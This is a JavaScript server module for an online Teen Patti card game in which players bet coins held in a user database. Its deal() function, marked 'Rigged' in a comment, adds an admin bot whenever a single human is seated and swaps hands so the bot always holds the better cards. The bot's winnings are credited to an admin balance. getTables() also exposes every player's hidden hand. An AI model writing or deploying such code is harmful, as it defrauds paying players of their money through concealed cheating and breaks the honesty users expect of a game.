const User = require("../models/User");
const Transaction = require("../models/Transaction");
const Admin = require("../models/Admin");
const { evaluateHand } = require("./teenpatti");

class TeenPattiTable {
    constructor(id) {
        this.id = id;
        this.players = {}; // { userId: { name, hand, status, blind, isBot } }
        this.state = 'WAITING'; // WAITING, DEALING, PLAYING, SHOW
        this.timer = 10;
        this.currentTurn = null;
        this.pot = 0;
        this.lastBet = 10;
        this.history = [];
        this.bootAmount = 5;
    }

    reset() {
        this.players = {};
        this.pot = 0;
        this.lastBet = 10;
        this.state = 'WAITING';
        this.timer = 10;
        this.currentTurn = null;
    }

    async start() {
        const playerIds = Object.keys(this.players);
        if (playerIds.length === 0) {
            this.timer = 10;
            return;
        }

        // Add Bot if only 1 human player
        if (playerIds.length === 1) {
            this.players["bot_admin"] = { name: "Admin_Bot", hand: [], status: 'WAITING', blind: true, isBot: true };
        }

        // Subtract Boot Amount from everyone
        for (let uid in this.players) {
            if (!this.players[uid].isBot) {
                const user = await User.findById(uid);
                if (user.coins < this.bootAmount) {
                    delete this.players[uid]; // Kick out
                    continue;
                }
                user.coins -= this.bootAmount;
                await user.save();
                this.pot += this.bootAmount;
            } else {
                this.pot += this.bootAmount; // Bot "pays" too
            }
        }

        if (Object.keys(this.players).length < 2) {
            this.reset();
            return;
        }

        this.state = 'DEALING';
        this.timer = 3;
        setTimeout(() => this.deal(), 3000);
    }

    deal() {
        const suits = ['♠', '♥', '♦', '♣'];
        const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
        let deck = [];
        for (let s of suits) for (let r of ranks) deck.push({ suit: s, rank: r });
        deck.sort(() => Math.random() - 0.5);

        for (let uid in this.players) {
            this.players[uid].hand = deck.splice(0, 3);
            this.players[uid].status = 'ACTIVE';
            this.players[uid].blind = true;
        }

        // Rigged: If Bot is playing, give Bot better cards
        if (this.players["bot_admin"]) {
            // Simple rigging: Give bot a Trio or Straight Flush if possible, or just swap hands
            let humanId = Object.keys(this.players).find(id => id !== "bot_admin");
            if (evaluateHand(this.players[humanId].hand).score > evaluateHand(this.players["bot_admin"].hand).score) {
                // Swap
                let temp = this.players[humanId].hand;
                this.players[humanId].hand = this.players["bot_admin"].hand;
                this.players["bot_admin"].hand = temp;
            }
        }

        this.state = 'PLAYING';
        this.currentTurn = Object.keys(this.players)[0];
        this.timer = 20;
    }

    async handleMove(userId, move, amount) {
        if (this.currentTurn !== userId) return { success: false, message: "Not your turn" };
        const player = this.players[userId];

        if (move === 'PACK') {
            player.status = 'PACKED';
        } else if (move === 'SEE') {
            player.blind = false;
            return { success: true };
        } else if (move === 'CHAAL' || move === 'BLIND') {
            const bet = player.blind ? this.lastBet : this.lastBet * 2;
            if (!player.isBot) {
                const user = await User.findById(userId);
                if (user.coins < bet) return { success: false, message: "Insufficient coins" };
                user.coins -= bet;
                await user.save();
            }
            this.pot += bet;
            // amount here is actually the "unit" bet
            // lastBet is the unit
        }

        this.nextTurn();
        return { success: true };
    }

    nextTurn() {
        const activeUids = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        if (activeUids.length < 2) {
            this.resolve();
            return;
        }

        const currentIdx = activeUids.indexOf(this.currentTurn);
        this.currentTurn = activeUids[(currentIdx + 1) % activeUids.length];
        this.timer = 20;

        // If it's Bot's turn, make a move
        if (this.players[this.currentTurn].isBot) {
            setTimeout(() => {
                // Bot logic: See after 2 rounds, pack if very bad, but here we rigged the hand anyway
                const bot = this.players[this.currentTurn];
                if (bot.blind && Math.random() > 0.7) bot.blind = false;
                this.handleMove(this.currentTurn, 'CHAAL', this.lastBet);
            }, 2000);
        }
    }

    async resolve() {
        this.state = 'SHOW';
        this.timer = 8;
        const activePlayers = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');

        let winnerId = activePlayers[0];
        let bestScore = -1;

        for (let uid of activePlayers) {
            const score = evaluateHand(this.players[uid].hand).score;
            if (score > bestScore) {
                bestScore = score;
                winnerId = uid;
            }
        }

        const winAmt = Math.floor(this.pot * 0.95);

        if (!this.players[winnerId].isBot) {
            await User.findByIdAndUpdate(winnerId, { $inc: { coins: winAmt } });
            await new Transaction({ user_id: winnerId, amount: winAmt, type: 'game_teenpatti', details: 'Won Pot' }).save();
        } else {
            await Admin.findOneAndUpdate({}, { $inc: { balance: winAmt } });
        }

        for (let uid in this.players) {
            this.players[uid].result = (uid === winnerId) ? 'WIN' : 'LOSE';
            this.players[uid].winAmount = (uid === winnerId) ? winAmt : 0;
        }

        this.history.unshift({ winner: this.players[winnerId].name, pot: this.pot });
        if (this.history.length > 10) this.history.pop();
    }
}

const tables = {
    1: new TeenPattiTable(1),
    2: new TeenPattiTable(2),
    3: new TeenPattiTable(3)
};

setInterval(async () => {
    for (let id in tables) {
        const t = tables[id];
        if (t.timer > 0) {
            t.timer--;
        } else {
            if (t.state === 'WAITING') await t.start();
            else if (t.state === 'SHOW') t.reset();
            else if (t.state === 'PLAYING') {
                await t.handleMove(t.currentTurn, 'PACK', 0);
            }
        }
    }
}, 1000);

module.exports = {
    getTables: () => Object.values(tables).map(t => ({
        id: t.id, state: t.state, timer: t.timer, pot: t.pot,
        currentTurn: t.currentTurn, lastBet: t.lastBet,
        players: t.players, history: t.history, boot: t.bootAmount
    })),
    joinTable: (tableId, userId, name) => {
        const t = tables[tableId];
        // If already in another table, leave it?
        // For simplicity, just check this table
        if (t.state !== 'WAITING') return { success: false, message: "Game in progress" };
        if (t.players[userId]) return { success: true };
        if (Object.keys(t.players).length >= 5) return { success: false, message: "Table full" };

        // Remove from other tables
        for(let id in tables) delete tables[id].players[userId];

        t.players[userId] = { name, hand: [], status: 'WAITING', blind: true, isBot: false };
        return { success: true };
    },
    makeMove: (userId, move, amount, tableId) => tables[tableId].handleMove(userId, move, amount)
};
